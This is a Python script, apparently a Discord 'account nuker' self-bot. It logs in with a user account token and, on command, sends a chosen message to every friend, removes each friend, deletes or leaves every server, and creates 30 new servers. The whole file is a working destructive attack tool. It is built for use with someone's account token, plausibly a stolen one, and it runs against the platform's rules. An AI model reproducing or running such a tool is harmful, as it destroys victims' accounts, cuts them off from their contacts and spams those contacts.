def warn(*args, **kwargs):
    pass
import warnings
warnings.warn = warn
import discord
from discord.ext import commands
from colorama import Fore, init
import ctypes
import time
import sys

init(autoreset=True)
green = Fore.LIGHTGREEN_EX
dgreen = Fore.GREEN
white = Fore.RESET
red = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
blue = Fore.LIGHTMAGENTA_EX
dblue = Fore.MAGENTA
gray = Fore.LIGHTBLACK_EX
intents = discord.Intents.all()

guild1 = f"{gray}[  {green}Guild{gray}  ]"
guild2 = f"{gray}[  {red}Guild{gray}  ]"
friends1 = f"{gray}[ {green}Friends{gray} ]"
friends2 = f"{gray}[ {red}Friends{gray} ]"

status1 = f"{gray}[ {green}Status{gray}  ]"
status2 = f"{gray}[ {red}Status{gray}  ]"

delete = f"[{red}-{gray}]{white}"
create = f"[{green}+{gray}]{white}"

def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)

bot = commands.Bot(command_prefix="--", case_insensitive=True, intents=discord.Intents.all(), self_bot=True)

print(f"""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{blue}
 ▄▄▄       ▄████▄   ▄████▄  ▒█████   █    ██  ███▄    █ ▄▄▄█████▓     ███▄    █  █    ██  ██ ▄█▀ ▓█████ ██▀███  
▒████▄    ▒██▀ ▀█  ▒██▀ ▀█ ▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒     ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▓██ ▒ ██▒
▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ▓██ ░▄█ ▒
░██▄▄▄▄██▒▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░     ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄▒██▀▀█▄  
 ▓█   ▓██░▒ ▓███▀ ░▒ ▓███▀ ░ ████▓▒░▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░     ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████░██▓ ▒██▒
 ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░       ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░
  ░   ▒▒    ░  ▒     ░  ▒    ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░    ░        ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ 
  ░   ▒   ░        ░       ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░   ░             ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░    ░░   ░ 
      ░   ░ ░      ░ ░         ░ ░     ░              ░                       ░    ░     ░  ░   ░   ░     ░     
""")
print(f"{gray}[{dblue}?{gray}]{white} Token: ", end="")
TOKEN = input()
print(f"{gray}[{dblue}?{gray}]{white} Guild Names: ", end="")
GUILD_NAMES = input()
print(f"{gray}[{dblue}?{gray}]{white} DM Message: ", end="")
DM_MESSAGE = input()
print(f"{gray}[{dblue}?{gray}]{white} Template Code (enter to skip): ", end="")
template_code = input().strip("https://discord.new/")
if template_code == "":
    template_code = None

@bot.event
async def on_ready():
    print(f"{gray}[{dblue}+{gray}]{white} Type --c anywhere to start.")

@bot.command()
async def c(ctx):
    for user in bot.user.relationships:
        if user.type == discord.RelationshipType.friend:
            try:
                user = bot.get_user(user.user.id)
                await user.send(DM_MESSAGE)
                await user.remove_friend()
                print(f"{friends1} {delete} {user.name}#{user.discriminator}")
            except:
                print(f"{friends2} {delete} {user.name}#{user.discriminator}")
    for guild in bot.guilds:
        try:
            await guild.delete()
            print(f"{guild1} {delete} {guild.name}")
        except:
            try:
                await guild.leave()
                print(f"{guild1} {delete} {guild.name}")
            except:
                print(f"{guild2} {delete} {guild.name}")
    for x in range(30):
        try:
            await bot.create_guild(name=GUILD_NAMES, code=template_code)
            print(f"{guild1} {create} {GUILD_NAMES}")
        except:
            print(f"{guild2} {create} {GUILD_NAMES}")

try:
    bot.run(TOKEN, bot=False)
except discord.errors.LoginFailure as e:
    print(f"{red}[!]{white} Invalid Token. Account Tokens Only.")
    print(e)
    time.sleep(5)
    sys.exit()
except Exception as e:
    print(f"{red}[!]{white} Unknown Error. Debug: {e}")
    time.sleep(5)
    sys.exit()
